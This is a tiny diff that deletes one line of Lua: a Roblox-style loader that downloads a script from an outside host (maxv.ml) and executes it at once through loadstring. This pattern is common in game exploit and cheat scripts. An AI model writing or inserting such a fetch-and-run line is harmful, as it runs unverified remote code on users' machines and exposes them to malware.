@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://maxv.ml/uploads/bnr.lua")))()
